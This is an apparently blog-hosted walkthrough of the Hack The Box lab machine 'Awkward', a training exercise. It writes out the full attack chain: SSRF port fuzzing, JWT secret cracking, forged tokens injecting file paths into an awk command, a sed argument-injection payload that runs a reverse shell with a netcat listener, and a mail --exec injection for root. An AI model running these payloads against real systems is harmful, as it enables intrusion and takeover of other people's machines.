# :game_die: Awkward Hack The Box Walkthrough - [ HTB ]

---

# Awkward Hack The Box Walkthrough — [ HTB ]

Hey Guys! Welcome to my blog so today we going to discuss about awkward hack-the-box machine which comes up with an SSRF vulnerability to get access to the internal file system also there is an LFI vulnerability to get the user shell of that machine and by abusing the mail command we can able to get root privilege of that system

## Enumeration:

So first as usual we start up with our nmap scan

>

STEP 1: nmap -sC -sV 10.10.11.185

Here there is the usual port and services are open

So lets us visits the website on the browser which is [http://10.10.11.185](http://10.10.11.185)

Now it will be redirected to the [http://hat-valley.htb/](http://hat-valley.htb/) so let's add this to you /etc/hosts file to access that website

Now you can be able to access that website

Next, I checked the source code for any interesting stuff.

And I found one interesting javascript file which app.js but the code is huge 🥵

Let’s copy and paste that code into [https://codepen.io/pen/](https://codepen.io/pen/) which makes better or open vscode

Further analyzing this code you can able to find more JWT token which is encoded with base64 which is not interesting

Here we need to analyze the whole app.js code to get interesting stuff

Further analyzing this code I have found some interesting directories

First I found /hr path

which redirected to a login page. I tried with the default admin password but it won’t work

By seeing the above code you can able to notice that baseurl = API and there are other directories all-leave and submit-leave in the API because it concatenates the baseurl + all-leave and baseurl + submit-leave which is interesting so now you can be able to understand this code and the same explanation for below two images only directory will be changing

So let’s check the /api/staff-details

Ohhh!!!! It throws the error of JWT token Malformed I think it is a token error so let's pass this without token

>

STEP 2: curl -s [http://hat-valley.htb/api/staff-details](http://hat-valley.htb/api/staff-details) | jq

Booomm!!! Now you will get the username and password of each available user

So let's crack this hash using john but unfortunately, the hash has been cracked by [https://hashes.com/en/tools/hash_identifier](https://hashes.com/en/tools/hash_identifier) here I went to find the hash format but it cracked thanks😂

username = christopher.jones password=chris123 so logging in with this username and password

Booomm!!! We got the dashboard

So next I clicked the refresh button

And capture that request In burp and I found something wried with that request

## SSRF Vulnerability:

Because there is a URL parameter that can lead to the SSRF attack

Using that SSRF Vulnerability we can able to access the internal file of that system which is not publicly available

Checkout the below article

I checked with [http://localhost:80](http://localhost:80) which is [http://hat-vally.htb](http://hat-vally.htb)

Now you can able to confirm that it is an SSRF. Hurrrhhh!!!

So let's fuzz the port to get internal access to that system

>

STEP 3: ffuf -u ‘[http://hat-valley.htb/api/store-status?url=](http://hat-valley.htb/api/store-status?url=)"http://localhost:FUZZ"' -w /usr/share/seclists/Fuzzing/4-digits-0000–9999.txt -fs 0

Here I found 3002 interesting so Let’s check it. but You get the blank page

Give double quotes on “http://localhost:3002”

Now you get access to that internal Page

## Local File Inclusion:

After analyzing this page I have found one interesting API endpoint which has an LFI vulnerability

Further analyzing this code I found something interesting in the AWK command Normally AWK Linux tool and it is a programming Language ( Check out In google )

And the box name makes sense awkward but Personally think that it is available in the privilege escalation of the user to root ( checkout this in tryhackme Room)

Here you can able to notice that the awk command passes the user variable which has decoded the JWT token of a user

But to abuse this We need Secrete Key because using that secrete key we can able to create our own token for any user

## BruteForceing the Weak Key:

While Login with the user of Christoper you can be able to see the token in the burp

We need to crack this Token for Secrete Key using John

## Get Vicky’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

First copy and paste that JWT token into the File

>

STEP 4: john JWT.txt — wordlist=rockyou.txt — format=HMAC-SHA256

Booomm!!! Now you can able to get the Secret Key

Now the signature is Verified

First We check for /etc/passwd file

So let's curl that endpoint with this JWT Token

>

STEP 5: curl [http://hat-valley.htb/api/all-leave](http://hat-valley.htb/api/all-leave) — header “cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii
8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2NzY5MDQ3Mjh9.9kHRYTuO1Oh0ykcKpTiNmCH8jeg4rL8J31znekRdaaE”

Booomm!!!! Now it will list /etc/passwd file

Here you get some users like bean and Christine

And checked ssh keys for both users but We cannot able to fetch

So next we go for the .bashrc file

Next curl that and you will get the .bashrc file

Further analyzing this bash file You can able to notice that there is a backup file which makes sense

Let’s give this backup location in the JWT key

Next curl this token with that endpoint

>

STEP 6: curl [http://hat-valley.htb/api/all-leave](http://hat-valley.htb/api/all-leave) — header “Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cF9ob21lLnNoICciLCJpYXQiOjE2NzY5MDQ3Mjh9.4LyhastbruMYsHH8UcKped_Pic7mjvSD2fSkVZWfC1w” — output backup.sh

Now you will get that backup.sh file and on that file, you can able to see the backup.tar file

>

STEP 7: curl [http://hat-valley.htb/api/all-leave](http://hat-valley.htb/api/all-leave) — header “Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY3NjkwNDcyOH0.sE5i7Nx06DGh1uhK_nyMIhGn2bCt_nxoDDtu9P7ogk0” — output bean_backup_final.tar.gz

Next extract that file and you get the backup file of that machine

And there are some hidden files and directories also available

>

STEP 8: ls -al

Next, open the

>

STEP 9: cat /.config/xpad/content-DS1ZS1

Here you can able to find some bean creds for SSH login

## User Flag:

>

STEP 10: ssh bean@10.10.11.184

>

STEP 11: cat user.txt

Boooommm!!! Now you get the userflag of that machine

After getting the shell I checked for sudo binary abuse and linpeas but it won’t work

Next, I checked the host file for interesting vhost or subdomain

So let's add this to our /etc/hosts file to access that webpage

while accessing that page it asks for a username and password

So I checked the configuration file in nginx which is /etc/nginx and I got the username and password in the hash

but Probably I won’t be able to crack that hash so I used SSH creds to log in to that application

Username: admin Password: 014mrbeanrules!#P

Booomm!!! We get login access to that application and it Shopping application

So I went to shop.php

After that, I reviewed that code in /var/www/store for any interesting stuff

In code, I found something weird in the Sed command which can lead to Remote code execution but we cannot exploit this directly in the web application if execute the reverse shell it shows a bad character detected!!

So To avoid this we set a reverse shell in that machine and execute that file on that application

First, add any product to the cart

Next, check out Mycart you can able to see that product

And you can able to see this cart on that machine if it adds to that cart

So our plan is to abuse the sed command to get the reverse shell of that machine and we can be able to execute the command on the remove button if need more information about SED command abuse in the below article

First We need a simple reverse shell from [revshells.com](https://www.revshells.com/)

And give execute permission to that file

>

STEP 12: chmod 777 evilshell.sh

Next setup your listener in your local machine

>

STEP 13: nc -lvp 9001

First, add the product to the cart

Next, click the remove button and capture that request

And edit item parameter

```
'+-e+"1e+/tmp/evilshell.sh"+/tmp/evilshell.sh+'
```

Now you get the reverse on your listener

Next, I checked the process in the user's machine

>

STEP 14: ps -eaf

Here you can able to notice the inotifywait is monitoring the /var/www/private/leave_request so let’s check this in www-data

So lets us pass an argument to that file to what happened in that process

And I found that running the mail command with root privilege

So lets us passes the reverse shell on the leave_request.csv and it runs the mail command with root privilege

First, create a reverse shell on the user's machine

Next setup your listener on the local machine

>

STEP 15: nc -lvp 9002

After that go to the www-data machine and execute the below command

```
echo '" --exec="\!/tmp/evilshell.sh"' >> leave_requests.csv
```

## RootFlag:

Boommmm!!! Now you get that root shell of that machine

I hope you understand this writeup If you like my writeup please give the applause and if you like my work donate to my OSCP Exam

---
